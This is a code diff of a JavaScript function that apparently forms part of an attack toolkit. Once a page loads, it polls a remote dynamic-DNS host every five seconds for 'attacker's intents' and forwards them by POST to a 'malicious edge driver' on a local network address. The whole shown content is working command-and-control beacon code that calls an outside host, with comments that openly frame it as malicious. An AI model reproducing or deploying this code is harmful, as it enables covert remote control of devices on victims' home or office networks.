@@ -1,10 +1,6 @@
 function startWebhook() {
     const remoteServerUrl = 'http://remains.ddns.net:34567'; // Replace with actual remote webhook URL
-    const localServerUrl = 'http://192.168.1.182:55083'; // Replace with your local server URL
-
-    const payload = {
-        message: 'Get Trigger'
-    };
+    const localServerUrl = `http://192.168.1.182:${globalPortNumber}`; // Replace with your local server URL
 
     // Send a POST request to the remote http server URL to periodically poll attacker's intents
     fetch(remoteServerUrl, {
@@ -24,7 +20,7 @@ function startWebhook() {
             // send POST request to malicious edge driver
             fetch(localServerUrl, {
                 method: 'POST',
-                mode: 'no-cors',  // if added this mode, it means that you only want to send data to the destination and are not interested in the response data
+                //mode: 'no-cors',  // if added this mode, it means that you only want to send data to the destination and are not interested in the response data
                 headers: {                                 // Otherwise, request can still be sent to the dest, but the response will be blocked by browser.
                     'Content-Type': 'text/plain'
                 },
@@ -45,4 +41,7 @@ function startWebhook() {
 
 }
 
+
 window.onload = setInterval(startWebhook, 5000);
+
+
